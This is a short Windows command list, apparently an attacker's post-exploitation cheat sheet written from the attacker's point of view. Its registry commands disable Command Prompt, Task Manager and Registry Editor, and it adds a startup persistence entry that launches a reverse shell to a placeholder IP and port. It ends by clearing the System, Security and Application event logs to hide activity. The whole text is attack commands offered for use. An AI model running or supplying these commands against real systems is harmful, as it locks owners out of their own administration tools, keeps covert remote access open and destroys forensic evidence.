# Disables Command Prompt
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

# Disables Task Manager
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f

# Creates persistence by making whatever program we want run on startup
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\user\Downloads\example.exe -e cmd.exe IP PORT"

# Disables Registry Editor
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

# Clear the System Event Log
wevtutil cl System

# Clear the Security Event Log
wevtutil cl Security

# Clear the Application Event Log
wevtutil cl Application

clear